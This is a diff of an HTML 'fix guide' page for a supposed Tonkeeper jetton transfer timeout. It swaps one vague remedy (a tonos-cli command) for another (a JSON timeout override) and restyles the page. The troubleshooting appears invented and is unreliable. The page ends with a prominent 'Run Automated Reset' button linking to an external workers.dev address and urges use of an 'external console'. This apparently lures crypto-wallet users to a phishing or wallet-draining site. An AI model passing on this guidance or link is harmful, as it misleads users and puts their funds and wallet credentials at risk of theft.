@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -42,28 +42,35 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a timeout error when attempting to transfer Tonkeeper Jettons, resulting in a failed transaction and an error message indicating a loop timeout.</li>
+<li>The user encounters an error message indicating a timeout during a Tonkeeper Jetton transfer, preventing the completion of the transaction. The error message explicitly states "Tonkeeper Jetton transfer loop timeout," and the transfer process appears to be stuck in an infinite loop.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a prolonged delay in the transaction processing, causing the system to timeout and abort the transfer.</li>
+<li>The error occurs due to a misconfiguration in the Tonkeeper settings or a temporary issue with the TON network, causing the transfer loop to exceed the maximum allowed time, resulting in a timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the transaction timeout threshold</li>
-<li>Verify the recipient's wallet address and ensure it is correctly formatted</li>
-<li>Check the network congestion and retry the transaction during a less busy period</li>
+<li>Check the Tonkeeper configuration files for any syntax errors or incorrect settings.</li>
+<li>Use the following JSON configuration to override the default timeout settings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span><span class="m">0</span>:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx<span class="w"> </span>transfer<span class="w"> </span><span class="s2">&quot;{\&quot;dest\&quot;:\&quot;0:yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\&quot;,\&quot;amount\&quot;:1000000000,\&quot;payload\&quot;:\&quot;\&quot;}&quot;</span><span class="w"> </span>--timeout<span class="w"> </span><span class="m">60</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Tonos-cli installed and configured on the system
-* A basic understanding of TON blockchain and Tonkeeper wallet functionality
-* The user has the necessary permissions and access rights to perform the transfer</p>
-<p>Consider utilizing an external console to execute these commands for a more streamlined experience.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+<ul>
+<li>Restart the Tonkeeper application to apply the changes.
+For more advanced troubleshooting, consider using an external console to execute low-level commands.</li>
+</ul>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonkeeper application installed and configured</li>
+<li>Basic understanding of TON network and Tonkeeper settings</li>
+<li>Access to the Tonkeeper configuration files</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-perps-deposit-and-convert-musd-this-paym.html">Metamask Extension Bug Perps Deposit And Convert Musd This Payment Route Isn't Available Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
